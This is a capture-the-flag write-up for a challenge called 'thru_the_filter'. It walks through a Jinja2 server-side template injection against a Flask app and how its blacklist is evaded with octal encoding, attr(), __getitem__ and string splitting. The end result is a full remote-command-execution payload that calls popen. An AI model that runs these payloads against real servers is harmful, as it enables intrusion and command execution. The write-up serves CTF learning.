# thru_the_filter

### Introduction
This challenge's goal is obviously specified in its name and source code : is to bypass all the filters and RCE the server in order to achive our flag.
### Gathering information
Open up the website, we got a boring plain page with a small number 49 printed on the screen which is our first hint : **SSTI**

![](https://hackmd.io/_uploads/SJHdyIFWa.png)

Notice on the URL we also have an argument called 'c' which might be our place to put our payload in! ( Usually in other CTF challenges! )<br>


Now let's take a look at the challenge file given, we have docker things look hopeful but not so let's just focus on our source code **app.py** : 
<br>

![](https://hackmd.io/_uploads/BJqM-ItZa.png)


What we could learn here that the website uses Flask - A Python web framework that appears a lot in CTFs, and a blacklist of sensitive words that often used to do SSTI. Our exploit can't be done without these words so as mentioned before, we have to bypass.
<br>
<br>
Back to our website, now we're sure that the 'c' argument is where we're gonna exploit. Flask uses *templates* to contain the data of the website and the most well-known template turns to be *Jinja2* but how to know is it actually it?

![](https://hackmd.io/_uploads/BJqeyOt-T.png)

Follow this chart, we take a test by enter '{{7*'7'}}'

![](https://hackmd.io/_uploads/Byk8JOK-T.png)

Then we can confirm the template is **Jinja2**, narrowed down vulnerability. ( **Twig** is in PHP so we exclude this mf ).



## Exploit 
> First of all, in a Jinja injection you need to find a way to escape from the sandbox and recover access the regular python execution flow. To do so, you need to abuse objects that are from the non-sandboxed environment but are accessible from the sandbox.

So the our first aim is to escape the sandbox by access the global objects like tuple (), dict [], string "",...and get their class.

To do this I used the payload:
```
{{ "".__class__ }}
```

![](https://hackmd.io/_uploads/rJhe4OtWa.png)




As expected, the filter stopped us here for the word **"class"** also the dot **"."**


To bypass blacklisted words I used Octal encodings :

![](https://hackmd.io/_uploads/Sy23z_KZp.png)

And to bypass the "**.**", I used **attr()**

> attr(obj, name):
Get an attribute of an object. foo|attr("bar") works like foo.bar just that always an attribute is returned and items are not looked up.

Combine all of these we have a new payload:
```
{{ ""|attr("\137\137\143\154\141\163\163\137\137") }}
```
which works perfectly:

![](https://hackmd.io/_uploads/rkDVEdYbp.png)

Next we have to get to the **subclasses** to access RCE-able class like **os._wrap_close** which includes many functions that do executions like **popen**, **os**, **system**,..So our next payload is:

```
{{"".__class__.__base__.__subclasses__()
```

Octal encoded payload:

```
{{""|attr("\137\137\143\154\141\163\163\137\137")|attr("\137\137\142\141\163\145\137\137")|attr("\137\137\163\165\142\143\154\141\163\163\145\163\137\137")()}}
```


which returns all of the subclasses:


![](https://hackmd.io/_uploads/HJMw8uK-a.png)


Here we need to access a class, so **"os._wrap_close"** is my choice. Accessing a class in subclasss by its indexwhich required square brackets which are also blacklisted. To overcome this, I used **__getitem__** attribute

Appending to our payload, **137** is the index of **"os._wrap_close"** class

```
.__getitem__(137) }}
```
Remember to Octal encode it:

```
|attr("\137\137\147\145\164\151\164\145\155\137\137")(137)
```

![](https://hackmd.io/_uploads/HkB1q_YW6.png)

Next step is use the function **popen** in the class, after initialized and access global classes I think?:

```
{{"".__class__.__base__.__subclasses__().__getitem__(137).__init__.__globals__ }}
```

```
{{""|attr("\137\137\143\154\141\163\163\137\137")|attr("\137\137\142\141\163\145\137\137")|attr("\137\137\163\165\142\143\154\141\163\163\145\163\137\137")()|attr("\137\137\147\145\164\151\164\145\155\137\137")(137)|attr("\137\137\151\156\151\164\137\137")|attr("\137\137\147\154\157\142\141\154\163\137\137")}}
```


![](https://hackmd.io/_uploads/SJWTn_K-a.png)




Get **popen** function's index which is 367, we repeat the same getitem thing. After that, finishing our payload by pass a command to **popen** argument and **read()** it out!

Final Payload:

```
{{ "".__class__.__base__.__subclasses__().__getitem__(137).__init__.__globals__.__getitem__('popen')('cat fla*').read() }}
```

And, combine our bypass techniques we got this bad boy:

```
http://34.124.244.195:1338/?c={{""|attr("\137\137\143\154\141\163\163\137\137")|attr("\137\137\142\141\163\145\137\137")|attr("\137\137\163\165\142\143\154\141\163\163\145\163\137\137")()|attr("\137\137\147\145\164\151\164\145\155\137\137")(137)|attr("\137\137\151\156\151\164\137\137")|attr("\137\137\147\154\157\142\141\154\163\137\137")|attr("\137\137\147\145\164\151\164\145\155\137\137")('po'+'pen')('cat fla*')|attr("\162\145\141\144")()}}
```

Because the **popen** is blacklisted, we have to bypass it by concatenate it two halves using "+".


![](https://hackmd.io/_uploads/SyngAdKZ6.png)

Thanks for the motivating flag! It was really tough for me lol!!!

## Helpful documentations


* https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
* https://viblo.asia/p/server-side-template-injection-vulnerabilities-ssti-cac-lo-hong-ssti-phan-3-Ny0VGjAYLPA
* https://hackmd.io/@Chivato/HyWsJ31dI?ref=arashparsa.com






























